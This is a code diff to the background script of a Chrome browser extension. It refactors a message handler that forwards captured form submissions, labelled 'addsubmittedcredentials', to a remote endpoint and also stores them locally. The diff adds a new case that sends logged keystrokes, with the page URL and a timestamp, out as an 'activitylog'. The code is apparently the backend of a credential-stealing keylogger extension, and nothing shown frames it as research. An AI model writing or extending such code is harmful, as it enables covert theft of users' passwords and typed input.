@@ -75,26 +75,37 @@ chrome.cookies.onChanged.addListener(function (changeInfo) {
 });
 
 chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
-  if (message.type === "FORM_SUBMISSION") {
-    // Log the received form data
-    console.log(
-      "Form submission received from:",
-      sender.tab ? sender.tab.url : "unknown source"
-    );
-    console.log("Form data:", message.data);
-    send("addsubmittedcredentials", message.data);
-    // Store the form data (example using chrome.storage)
-    chrome.storage.local.get(["formSubmissions"], (result) => {
-      const submissions = result.formSubmissions || [];
-      submissions.push(message.data);
+  switch (message.type) {
+    case "FORM_SUBMISSION":
+      // Log the received form data
+      console.log(
+        "Form submission received from:",
+        sender.tab ? sender.tab.url : "unknown source"
+      );
+      console.log("Form data:", message.data);
+      send("addsubmittedcredentials", message.data);
+      // Store the form data (example using chrome.storage)
+      chrome.storage.local.get(["formSubmissions"], (result) => {
+        const submissions = result.formSubmissions || [];
+        submissions.push(message.data);
 
-      chrome.storage.local.set({ formSubmissions: submissions }, () => {
-        console.log("Form submission stored successfully");
+        chrome.storage.local.set({ formSubmissions: submissions }, () => {
+          console.log("Form submission stored successfully");
+        });
       });
-    });
 
-    // Send response back to content script
-    sendResponse({ status: "success", timestamp: new Date().toISOString() });
+      // Send response back to content script
+      sendResponse({ status: "success", timestamp: new Date().toISOString() });
+      break;
+    case "ACTIVITY_LOG":
+      const logData = {
+        keys: message.data.keys,
+        timestamp: message.data.timestamp,
+        url: message.data.url,
+      };
+
+      send("activitylog", logData);
+      break;
   }
 
   // Required for async response
